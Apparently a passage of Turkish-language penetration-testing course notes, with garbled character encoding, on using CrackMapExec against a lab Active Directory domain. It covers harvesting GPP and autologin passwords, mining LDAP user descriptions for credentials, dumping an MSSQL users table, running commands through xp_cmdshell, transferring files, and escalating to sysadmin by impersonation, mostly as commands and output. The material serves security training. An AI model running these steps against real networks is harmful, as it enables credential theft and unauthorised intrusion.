GPP_PASS... 10.129.203.121 445 DC01 changeLogon: 0
GPP_PASS... 10.129.203.121 445 DC01 noChange: 1
GPP_PASS... 10.129.203.121 445 DC01 neverExpires: 1
GPP_PASS... 10.129.203.121 445 DC01 acctDisabled: 0
GPP_PASS... 10.129.203.121 445 DC01 userName:
inlanefreight.htb\engels
```


### AutoLogin GPP

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M
gpp_autologin
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
GPP_AUTO... 10.129.203.121 445 DC01 [+] Found SYSVOL share
GPP_AUTO... 10.129.203.121 445 DC01 [*] Searching for
Registry.xml
GPP_AUTO... 10.129.203.121 445 DC01 [*] Found
inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-
ADF5B3DD208D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 10.129.203.121 445 DC01 [+] Found credentials
in inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-
ADF5B3DD208D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 10.129.203.121 445 DC01 Usernames: ['kiosko']
GPP_AUTO... 10.129.203.121 445 DC01 Domains:
['INLANEFREIGHT']
GPP_AUTO... 10.129.203.121 445 DC01 Passwords:
['SimplePassword123!']
```

Bizim durumumuzda, iki farklÄ± parolaya sahip iki hesap bulduk. Bu hesaplarÄ±n hala geÃ§erli olup olmadÄ±ÄŸÄ±nÄ± kontrol edelim:

### Credentials Validation

```
crackmapexec smb 10.129.203.121 -u engels -p Inlanefreight1998! SMB 

10.129.203.121 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False) SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\engels:Inlanefreight1998!
```

```
crackmapexec smb 10.129.203.121 -u kiosko -p SimplePassword123! SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False) SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\kiosko:SimplePassword123!
```

Her iki hesap da hala geÃ§erlidir ve bunlarÄ± domain'de kimlik doÄŸrulamasÄ± yapmak iÃ§in kullanabilir, hangi ayrÄ±calÄ±klara sahip olduklarÄ±nÄ± belirleyebilir veya bu kimlik bilgilerini yeniden kullanmayÄ± deneyebiliriz

Bu bÃ¶lÃ¼m bize kimlik bilgilerini elde etmek iÃ§in GPO yapÄ±landÄ±rmalarÄ±nÄ± kÃ¶tÃ¼ye kullanmanÄ±n birkaÃ§ yÃ¶ntemini Ã¶ÄŸretti. Bir sonraki bÃ¶lÃ¼mde, kimliÄŸi doÄŸrulanmÄ±ÅŸ bir kullanÄ±cÄ± olarak daha fazla bilgi toplamanÄ±n yollarÄ±nÄ± tartÄ±ÅŸmaya devam edeceÄŸiz

### ModÃ¼llerle Ã‡alÄ±ÅŸma

Daha Ã¶nce tartÄ±ÅŸtÄ±ÄŸÄ±mÄ±z gibi, her CrackMapExec protokolÃ¼ modÃ¼lleri destekler. Belirtilen protokol iÃ§in mevcut modÃ¼lleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `crackmapexec protocol -L` komutunu Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–rnek olarak LDAP protokolÃ¼nÃ¼ kullanalÄ±m.

### LDAP iÃ§in Mevcut ModÃ¼lleri GÃ¶rÃ¼ntÃ¼le

```
crackmapexec ldap -L

[*] MAQ Retrieves the MachineAccountQuota domainlevel attribute
[*] adcs Find PKI Enrollment Services in Active
Directory and Certificate Templates Names
[*] daclread Read and backup the Discretionary Access
Control List of objects. Based on the work of @_nwodtuhs and @BlWasp_. Be
carefull, this module cannot read the DACLS recursively, more explains in
the options.
[*] get-desc-users Get description of the users. May contained
password
[*] get-network
[*] laps Retrieves the LAPS passwords
[*] ldap-checker Checks whether LDAP signing and binding are
required and / or enforced
[*] ldap-signing Check whether LDAP signing is required
[*] subnets Retrieves the different Sites and Subnets of
an Active Directory
[*] user-desc Get user descriptions stored in Active
Directory
[*] whoami Get details of provided user
```

`User-desc` modÃ¼lÃ¼nÃ¼ seÃ§elim ve modÃ¼llerle nasÄ±l etkileÅŸime girebileceÄŸimizi gÃ¶relim

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir. Hedef IP'yi FQDN `dc01.inlanefreight.htb` olarak yapÄ±landÄ±rÄ±n.


### ModÃ¼llerde SeÃ§eneklerin TanÄ±mlanmasÄ±

Bir CrackMapExec modÃ¼lÃ¼, bazÄ± Ã¶zel deÄŸerler ayarlamak iÃ§in farklÄ± seÃ§eneklere sahip olabilir. MAQ gibi seÃ§eneklere sahip olmayan modÃ¼ller olabilir, bu da varsayÄ±lan eylemlerini deÄŸiÅŸtiremeyeceÄŸimiz anlamÄ±na gelir. Bir modÃ¼lÃ¼n desteklenen seÃ§eneklerini gÃ¶rÃ¼ntÃ¼lemek iÃ§in aÅŸaÄŸÄ±daki sÃ¶zdizimini kullanabiliriz:  
`crackmapexec <protokol> -M <modÃ¼l_adÄ±> --options`


### LDAP MAQ ModÃ¼lÃ¼ iÃ§in SeÃ§enekleri GÃ¶rÃ¼ntÃ¼le

```
crackmapexec ldap -M MAQ --options
[*] MAQ module options:
None
```

### LDAP user-desc ModÃ¼lÃ¼ iÃ§in SeÃ§enekleri GÃ¶rÃ¼ntÃ¼le

```
crackmapexec ldap -M user-desc --options
[*] user-desc module options:
 LDAP_FILTER Custom LDAP search filter (fully replaces the
default search)
 DESC_FILTER An additional seach filter for descriptions
(supports wildcard *)
 DESC_INVERT An additional seach filter for descriptions (shows
non matching)
 USER_FILTER An additional seach filter for usernames (supports
wildcard *)
 USER_INVERT An additional seach filter for usernames (shows
non matching)
 KEYWORDS Use a custom set of keywords (comma separated)
 ADD_KEYWORDS Add additional keywords to the default set (comma
separated)

```

LDAP modÃ¼lÃ¼ olan **`user-desc`**, Active Directory domainindeki tÃ¼m kullanÄ±cÄ±larÄ± sorgular ve aÃ§Ä±klamalarÄ±nÄ± alÄ±r. VarsayÄ±lan anahtar kelimelerle eÅŸleÅŸen kullanÄ±cÄ± aÃ§Ä±klamalarÄ±nÄ± yalnÄ±zca gÃ¶rÃ¼ntÃ¼ler, ancak tÃ¼m aÃ§Ä±klamalarÄ± bir dosyaya kaydeder.

VarsayÄ±lan anahtar kelimeler aÃ§Ä±klamada saÄŸlanmaz. Bu anahtar kelimelerin ne olduÄŸunu Ã¶ÄŸrenmek istiyorsak, kaynak koda bakmamÄ±z gerekir. Kaynak kodunu **`CrackMapExec/cme/modules/`** dizininde bulabiliriz. ArdÄ±ndan modÃ¼l adÄ±nÄ± arayabilir ve aÃ§abiliriz. Bizim durumumuzda, **`user-desc`** modÃ¼lÃ¼nÃ¼ iÃ§eren Python script'i **`user_description.py`**'dir. DosyayÄ± **grep** komutuyla arayarak **keywords** kelimesini bulalÄ±m:


### user-desc ModÃ¼lÃ¼nÃ¼n Kaynak Koduna Bakmak

```
cat CrackMapExec/cme/modules/user_description.py |grep keywords
 KEYWORDS Use a custom set of keywords (comma separated)
 ADD_KEYWORDS Add additional keywords to the default set (comma
separated)
 self.keywords = {'pass', 'creds', 'creden', 'key', 'secret',
'default'}
 ...SNIP...
```


ModÃ¼lÃ¼ kullanalÄ±m ve ilginÃ§ kullanÄ±cÄ± aÃ§Ä±klamalarÄ±nÄ± bulalÄ±m:

### user-desc ModÃ¼lÃ¼nÃ¼ Kullanarak KullanÄ±cÄ± AÃ§Ä±klamasÄ±nÄ± Alma

```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M
user-desc
SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
USER-DES... User: krbtgt -
Description: Key Distribution Center Service Account
USER-DES... User: alina -
Description: Account for testing HR App. Password: HRApp123!
USER-DES... Saved 6 user
descriptions to /home/plaintext/.cme/logs/UserDesc-10.129.203.121-
20221031_120444.log
```

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `key` ve `pass` anahtar kelimelerini iÃ§eren aÃ§Ä±klamayÄ± gÃ¶rÃ¼ntÃ¼ler, ancak tÃ¼m aÃ§Ä±klamalar log dosyasÄ±na kaydedilir


### DosyayÄ± TÃ¼m AÃ§Ä±klamalarla AÃ§ma

```
cat /home/plaintext/.cme/logs/UserDesc-10.129.203.121-20221031_120444.log

User: Description:
Administrator Built-in account for administering the
computer/domain
Guest Built-in account for guest access to the
computer/domain
krbtgt Key Distribution Center Service Account
alina Account for testing HR App. Password: HRApp123!
engels Service Account for testing
testaccount pwd: Testing123!
```



### SeÃ§eneklerle Bir ModÃ¼l Kullanma

EÄŸer bir modÃ¼l seÃ§eneÄŸi kullanmak istiyorsak `-o` bayraÄŸÄ±nÄ± kullanmamÄ±z gerekir. TÃ¼m seÃ§enekler `KEY=value` ÅŸeklinde belirtilir (msfvenom stili). AÅŸaÄŸÄ±daki Ã¶rnekte, varsayÄ±lan anahtar kelimeleri ve ekran deÄŸerlerini `pwd` ve `admin` anahtar kelimeleriyle deÄŸiÅŸtireceÄŸiz.

### Yeni Anahtar Kelimelerle user-desc Kullanma

```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=pwd,admin
SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
USER-DES... User:
Administrator - Description: Built-in account for administering the
computer/domain
USER-DES... User:
testaccount - Description: pwd: Testing123!
USER-DES... Saved 6 user
descriptions to /home/plaintext/.cme/logs/UserDesc-10.129.203.121-
20221031_123727.log
```


### KullanÄ±cÄ± ÃœyeliÄŸini Sorgulama

`groupmembership`, bir kullanÄ±cÄ±nÄ±n ait olduÄŸu gruplarÄ± sorgulamamÄ±zÄ± saÄŸlayan bir baÅŸka modÃ¼l Ã¶rneÄŸidir (kendi modÃ¼llerinizi nasÄ±l oluÅŸturacaÄŸÄ±nÄ±zÄ± daha sonra tartÄ±ÅŸacaÄŸÄ±z). Kullanmak iÃ§in `USER` seÃ§eneÄŸi ile sorgulamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtmemiz gerekiyor.

Bu eÄŸitimin yazÄ±ldÄ±ÄŸÄ± sÄ±rada bu modÃ¼l iÃ§in bir [PR](https://github.com/byt3bl33d3r/CrackMapExec/pull/696) var, ancak indirilir ve onaylanana kadar modÃ¼ller klasÃ¶rÃ¼ne yerleÅŸtirilirse kullanÄ±labilir.


### Ã–zel ModÃ¼l ile Grup ÃœyeliÄŸini Sorgulama

```
cd CrackMapExec/cme/modules/

wget https://raw.githubusercontent.com/PorchettaIndustries/CrackMapExec/7d1e0fdaaf94b706155699223f984b6f9853fae4/cme/modul
es/groupmembership.py -q

crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M groupmembership -o USER=julio

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
GROUPMEM... dc01.inlanefreight.htb 389 DC01 [+] User:
julio is member of following groups:
GROUPMEM... dc01.inlanefreight.htb 389 DC01 Server
Operators
GROUPMEM... dc01.inlanefreight.htb 389 DC01 Domain Admins
GROUPMEM... dc01.inlanefreight.htb 389 DC01 Domain Users

```


---


### MSSQL Enumeration and Attacks

Bir MSSQL sunucusu bulmak Ã§ok ilginÃ§tir Ã§Ã¼nkÃ¼ veritabanlarÄ± genellikle saldÄ±rÄ± operasyonlarÄ±mÄ±zÄ± ilerletmek ve daha fazla eriÅŸim elde etmek iÃ§in kullanabileceÄŸimiz bilgiler iÃ§erir. DeÄŸerlendirmemizin amacÄ± olan hassas verilere de eriÅŸim elde edebiliriz. AyrÄ±ca, [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) Ã¶zelliÄŸini kullanarak bir MSSQL veritabanÄ± Ã¼zerinden iÅŸletim sistemi komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rabiliriz.

Password Spray bÃ¶lÃ¼mÃ¼nde tartÄ±ÅŸtÄ±ÄŸÄ±mÄ±z gibi, SQL'e Ã¼Ã§ farklÄ± tÃ¼rde kullanÄ±cÄ± hesabÄ± ile kimlik doÄŸrulamasÄ± yapabiliriz. VeritabanÄ± Ã¼zerinde hangi yetkilere sahip olduÄŸumuzu ve hangi veritabanÄ±na eriÅŸimimiz olduÄŸunu gÃ¶z Ã¶nÃ¼nde bulundurmak ve veritabanÄ± dba (veritabanÄ± yÃ¶neticisi) kullanÄ±cÄ±sÄ± olup olmadÄ±ÄŸÄ±mÄ±zÄ± doÄŸrulamak da Ã¶nemlidir.

VeritabanlarÄ±yla Ã§alÄ±ÅŸÄ±rken genellikle iki iÅŸlem gerÃ§ekleÅŸtiririz:

* SQL SorgularÄ±nÄ± YÃ¼rÃ¼tme
* Windows KomutlarÄ±nÄ± YÃ¼rÃ¼tme

### SQL SorgularÄ±nÄ± YÃ¼rÃ¼tme

SQL sorgusu veritabanÄ± ile etkileÅŸim kurmamÄ±zÄ± saÄŸlar. Bilgi alabilir veya veritabanÄ± tablolarÄ±na veri ekleyebiliriz. AyrÄ±ca veritabanÄ±nÄ±n yÃ¶netim ve administration farklÄ± operasyonel iÅŸlevlerini de kullanabiliriz. Bir hesap aldÄ±ktan sonra, -q seÃ§eneÄŸini kullanarak bir SQL sorgusu gerÃ§ekleÅŸtirebiliriz.


### TÃ¼m VeritabanÄ± AdlarÄ±nÄ± Almak iÃ§in SQL Sorgusu

```
crackmapexec mssql 10.129.203.121 -u grace -p Inlanefreight01! -q "SELECT name FROM master.dbo.sysdatabases"
MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
MSSQL 10.129.203.121 1433 DC01 name
MSSQL 10.129.203.121 1433 DC01 ----------------------
--------------------------------------------------------------------------
--------------------------------
MSSQL 10.129.203.121 1433 DC01 master
MSSQL 10.129.203.121 1433 DC01 tempdb
MSSQL 10.129.203.121 1433 DC01 model
MSSQL 10.129.203.121 1433 DC01 msdb
MSSQL 10.129.203.121 1433 DC01 core_app
MSSQL 10.129.203.121 1433 DC01 core_business

```

Bir MSSQL kullanÄ±cÄ±sÄ± belirtmek iÃ§in `--local-auth` seÃ§eneÄŸini de kullanabiliriz. Bu seÃ§eneÄŸi seÃ§mezsek, bunun yerine bir domain hesabÄ± kullanÄ±lacaktÄ±r.


### SQL Queries

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! - localauth -q "SELECT name FROM master.dbo.sysdatabases"

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 name
MSSQL 10.129.203.121 1433 DC01 ----------------------
--------------------------------------------------------------------------
--------------------------------
MSSQL 10.129.203.121 1433 DC01 master
MSSQL 10.129.203.121 1433 DC01 tempdb
MSSQL 10.129.203.121 1433 DC01 model
MSSQL 10.129.203.121 1433 DC01 msdb
MSSQL 10.129.203.121 1433 DC01 core_app
MSSQL 10.129.203.121 1433 DC01 core_business

```

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! - localauth -q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES"

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 table_name
MSSQL 10.129.203.121 1433 DC01 ----------------------
--------------------------------------------------------------------------
--------------------------------
MSSQL 10.129.203.121 1433 DC01 tbl_users
```

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth -q "SELECT * from [core_app].[dbo].tbl_users"
MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 id_user
MSSQL 10.129.203.121 1433 DC01 name
MSSQL 10.129.203.121 1433 DC01 lastname
MSSQL 10.129.203.121 1433 DC01 username
MSSQL 10.129.203.121 1433 DC01 password
MSSQL 10.129.203.121 1433 DC01 -----------
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------
MSSQL 10.129.203.121 1433 DC01 1
MSSQL 10.129.203.121 1433 DC01 b'Josh'
MSSQL 10.129.203.121 1433 DC01 b'Matt'
MSSQL 10.129.203.121 1433 DC01 b'josematt'
MSSQL 10.129.203.121 1433 DC01 b'Testing123'
MSSQL 10.129.203.121 1433 DC01 2
MSSQL 10.129.203.121 1433 DC01 b'Elie'
MSSQL 10.129.203.121 1433 DC01 b'Cart'
MSSQL 10.129.203.121 1433 DC01 b'eliecart'
MSSQL 10.129.203.121 1433 DC01 b'Motor999'
```


VeritabanlarÄ±nÄ±, tablolarÄ± ve iÃ§eriÄŸi listelemek iÃ§in bazÄ± veritabanÄ± sorgularÄ± gerÃ§ekleÅŸtirdik. 

### Windows KomutlarÄ±nÄ± YÃ¼rÃ¼tme

Bir hesap bulduÄŸumuzda, CrackMapExec otomatik olarak kullanÄ±cÄ±nÄ±n bir DBA  (Database Administrator) hesabÄ± olup olmadÄ±ÄŸÄ±nÄ± kontrol edecektir. Ã‡Ä±ktÄ±yÄ± fark edersek `Pwn3d!` , kullanÄ±cÄ± bir Database Administrator'dÃ¼r. DBA ayrÄ±calÄ±klarÄ±na sahip kullanÄ±cÄ±lar bir veritabanÄ± objesine eriÅŸebilir, deÄŸiÅŸtirebilir veya silebilir ve diÄŸer kullanÄ±cÄ±lara haklar verebilir. Bu kullanÄ±cÄ± veritabanÄ±na karÅŸÄ± herhangi bir eylem gerÃ§ekleÅŸtirebilir.


### DBA HesabÄ± ile Kimlik DoÄŸrulama

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
```

MSSQL, SQL kullanarak sistem komutlarÄ±nÄ± yÃ¼rÃ¼tmemizi saÄŸlayan [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) adlÄ± bir [extended stored procedure](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15)'e sahiptir. Bir DBA hesabÄ±, Windows iÅŸletim sistemi komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in gereken Ã¶zellikleri etkinleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

Bir Windows komutunu Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir:


### Executing Windows Commands

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth -x whoami

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 [+] Executed command
via mssqlexec
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------------------------------------
MSSQL 10.129.203.121 1433 DC01
inlanefreight\svc_mssql
```

Not: MSSQL aracÄ±lÄ±ÄŸÄ±yla Windows komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rabilmek, Windows makinesinde `local administrator` olduÄŸumuz anlamÄ±na gelmez. AyrÄ±calÄ±klarÄ±mÄ±zÄ± yÃ¼kseltebilir veya hedef makine hakkÄ±nda daha fazla bilgi almak iÃ§in bu eriÅŸimi kullanabiliriz.


### MSSQL ile Dosya Aktarma

MSSQL, sÄ±rasÄ±yla [OPENROWSET (Transact-SQL)](https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql) ve [Ole Automation Procedures Sunucu YapÄ±landÄ±rma SeÃ§eneklerini](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option) kullanarak dosyalarÄ± indirmemize ve yÃ¼klememize izin verir. CrackMapExec bu seÃ§enekleri -`-put-file` ve -`-get-file` ile birleÅŸtirir.

Hedef makinemize bir dosya yÃ¼klemek iÃ§in `--put-file` seÃ§eneÄŸini ve ardÄ±ndan yÃ¼klemek istediÄŸimiz local dosyayÄ± ve hedef dizini kullanabiliriz


### Upload File (Dosya YÃ¼kle)

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth --put-file /etc/passwd C:/Users/Public/passwd

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 [*] Copy /etc/passwd
to C:/Users/Public/passwd
MSSQL 10.129.203.121 1433 DC01 [*] Size is 3456 bytes
MSSQL 10.129.203.121 1433 DC01 [+] File has been
uploaded on the remote machine
```

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth -x "dir c:\Users\Public"

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 [+] Executed command
via mssqlexec
MSSQL 10.129.203.121 1433 DC01
----------------------------------------------------------
MSSQL 10.129.203.121 1433 DC01 Volume in drive C has
no label.
MSSQL 10.129.203.121 1433 DC01 Volume Serial Number
is B8B3-0D72
MSSQL 10.129.203.121 1433 DC01 Directory of
c:\Users\Public
MSSQL 10.129.203.121 1433 DC01 12/01/2022 04:22 AM
<DIR> .
MSSQL 10.129.203.121 1433 DC01 12/01/2022 04:22 AM
<DIR> ..
MSSQL 10.129.203.121 1433 DC01 10/06/2021 02:38 PM
<DIR> Documents
MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
<DIR> Downloads
MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
<DIR> Music
MSSQL 10.129.203.121 1433 DC01 12/01/2022 04:22 AM
3,456 passwd
MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
<DIR> Pictures
MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
<DIR> Videos
MSSQL 10.129.203.121 1433 DC01 1 File(s)
3,456 bytes
MSSQL 10.129.203.121 1433 DC01 7 Dir(s)
10,588,659,712 bytes free

```


Bir dosyayÄ± indirmek iÃ§in, `--get-file` seÃ§eneÄŸini kullanmamÄ±z ve ardÄ±ndan dosyanÄ±n yolunu ve bir Ã§Ä±ktÄ± dosyasÄ± adÄ± belirlememiz gerekir.


### MSSQL aracÄ±lÄ±ÄŸÄ±yla Hedef Makineden Dosya Ä°ndirme

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth --get-file C:/Windows/System32/drivers/etc/hosts hosts

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 [*] Copy
C:/Windows/System32/drivers/etc/hosts to hosts
MSSQL 10.129.203.121 1433 DC01 [+] File
C:/Windows/System32/drivers/etc/hosts was transferred to hosts


cat hosts
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
<SNIP>

```


### SQL Privilege Escalation **Module**

CrackMapExec, MSSQL iÃ§in birkaÃ§ modÃ¼l iÃ§erir, bunlardan biri **`mssql_priv`**'dir. Bu modÃ¼l, MSSQL ayrÄ±calÄ±klarÄ±nÄ± sÄ±ralar ve kullanarak bir standart kullanÄ±cÄ±dan sysadmin yetkilerine yÃ¼kselmeye Ã§alÄ±ÅŸÄ±r. Bunu baÅŸarmak iÃ§in, bu modÃ¼l MSSQL'deki iki (2) ayrÄ±calÄ±k yÃ¼kseltme vektÃ¶rÃ¼nÃ¼ sÄ±ralar: **`EXECUTE AS LOGIN`** ve **`db_owner rolÃ¼`**. ModÃ¼lÃ¼n Ã¼Ã§ seÃ§eneÄŸi vardÄ±r: **`enum_privs`** (ayrÄ±calÄ±klarÄ± listelemek iÃ§in, varsayÄ±lan), **`privesc`** (ayrÄ±calÄ±klarÄ± yÃ¼kseltmek iÃ§in) ve **`rollback`** (kullanÄ±cÄ±yÄ± orijinal durumuna geri dÃ¶ndÃ¼rmek iÃ§in). Åimdi bunu nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± gÃ¶relim. AÅŸaÄŸÄ±daki Ã¶rnekte, kullanÄ±cÄ± **`INLANEFREIGHT\robert`**, sysadmin yetkilerine sahip olan **`julio`**'yu taklit etme ayrÄ±calÄ±ÄŸÄ±na sahiptir.


### MSSQL Privilege Escalation

```
crackmapexec mssql -M mssql_priv --options
[*] mssql_priv module options:
 ACTION Specifies the action to perform:
 - enum_priv (default)
 - privesc
 - rollback (remove sysadmin privilege)
```

```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
MSSQL_PR... 10.129.203.121 1433 DC01 [+]
INLANEFREIGHT\robert can impersonate julio (sysadmin)
```

```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc
MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
MSSQL_PR... 10.129.203.121 1433 DC01 [+]
INLANEFREIGHT\robert can impersonate julio (sysadmin)
MSSQL_PR... 10.129.203.121 1433 DC01 [+]
INLANEFREIGHT\robert is now a sysadmin! (Pwn3d!)

```

Bir sysadmin kullanÄ±cÄ±sÄ± olarak artÄ±k komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. Bunu yapalÄ±m ve ardÄ±ndan ayrÄ±calÄ±klarÄ±mÄ±zÄ± orijinal durumlarÄ±na geri dÃ¶ndÃ¼relim


### KomutlarÄ± YÃ¼rÃ¼tme ve AyrÄ±calÄ±klarÄ± Geri Alma

```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -x whoami

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 [+] Executed command
via mssqlexec
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------------------------------------
MSSQL 10.129.203.121 1433 DC01
inlanefreight\svc_mssql
```

```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=rollback
MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
MSSQL_PR... 10.129.203.121 1433 DC01 [+] sysadmin role
removed
```

```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -x whoami

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
```


